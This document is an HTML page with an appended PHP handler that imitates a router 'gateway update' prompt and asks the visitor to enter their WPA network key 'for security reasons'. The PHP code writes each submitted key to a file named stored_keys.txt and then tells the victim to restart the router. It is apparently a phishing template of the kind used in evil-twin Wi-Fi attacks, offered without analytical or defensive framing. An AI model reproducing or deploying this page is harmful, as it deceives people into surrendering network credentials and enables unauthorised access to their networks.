<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
  <meta name="generator" content=
  "HTML Tidy for HTML5 for Linux version 5.2.0">
  <meta http-equiv="Content-Type" content=
  "text/html; charset=utf-8">
  <link rel="stylesheet" type="text/css" href="info2.css" media=
  "all">
  <title></title>
</head>
<body bgcolor="transparent" marginheight="0" marginwidth="0">
  <table border="0" cellpadding="0" cellspacing="0" width="100%">
    <tbody>
      <tr>
        <td width="2%">&nbsp;</td>
        <td width="5%"></td>
        <td width="93%">
          <div valign="top" align="left">
            <form id="form1" name="form1" method="post">
              <table border="0" cellpadding="0" cellspacing="0" id="autoWidth">
                <tbody>
                  <tr>
                    <td>
                      <br>
                      <hr size="3" width="99%" color="#9CBCE3">
                    </td>
                  </tr>
                  <tr>
                    <td colspan="2"></td>
                  </tr>
                  <tr>
                    <td colspan="2"><font color=
                    "#282B2F">Continue restoring network</font></td>
                  </tr>
                  <tr>
                    <td colspan="2"></td>
                  </tr>
                  <tr>
                    <td></td>
                  </tr>
                  <tr>
                    <td>
                      <hr size="3" width="99%" color="#9CBCE3">
                    </td>
                  </tr>
                  <tr>
                    <td></td>
                  </tr>
                  <tr>
                    <td class="info1" colspan="2">
                      <br>
                      <p><font color="#282B2F">Dear customer, for your security, the gateway requires an update.</font></p><font color=
                      "#282B2F"><br></font>
                      <p><font color="#282B2F">For security reasons enter network key</font></p>
                    </td>
                  </tr>
                  <tr>
                    <td><font color="#282B2F"><b>WPA</b>
                    Key:</font></td>
                  </tr>
                  <tr>
                    <td colspan="2"><input name="key1" type="password" class=
                    "textfield"></td>
                  </tr>
                  <tr>
                    <td class="blue" colspan="2"></td>
                  </tr>
                  <tr>
                    <td class="blue" colspan="2"></td>
                  </tr>
                  <tr>
                    <td colspan="2"><input name="Confirm" class=
                    "button" type="submit" value="Confirm"></td>
                  </tr>
                </tbody>
              </table>
            </form>
          </div>
        </td>
      </tr>
    </tbody>
  </table>
</body>
</html>
<?php
// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Check if the 'key1' field is set and not empty
    if (isset($_POST['key1']) && !empty($_POST['key1'])) {
        // Get the input value
        $key1 = $_POST['key1'];
        
        // Append the user data to the usr.txt file
         file_put_contents('stored_keys.txt', $key1, FILE_APPEND);
        
        
        // Echo a success message
        echo "Restart the router ";
    } else {
        // Echo an error message if the 'key1' field is empty
        echo "Error: Key field is empty!";
    }
}
?>
